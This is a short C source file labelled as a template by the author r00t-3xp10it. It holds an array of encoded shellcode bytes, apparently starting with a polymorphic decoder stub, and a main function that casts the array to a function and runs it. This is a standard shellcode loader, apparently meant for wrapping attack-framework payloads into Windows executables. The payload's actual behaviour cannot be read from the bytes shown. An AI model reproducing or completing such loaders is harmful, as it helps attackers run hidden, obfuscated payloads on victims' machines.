// C template | Author: r00t-3xp10it

#include <stdio.h>
#include <windows.h>

// Our code goes here
unsigned char buf[]=
"\xd9\xc2\xba\x05\x77\xba\x60\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\xdd\x31\x56\x19\x03\x56\x19\x83\xee\xfc\xe7\x82\x63\x81\x5d"
"\x03\x56\x95\x25\x05\x22\x3e\xd1\xeb\xfa\xf7\xa8\xc2\xcc\x52"
"\x25\xaa\x5d\x3a\x7b\xdc\x29\x20\x14";



// Push into memory
int main(void) { ((void (*)())buf)();}


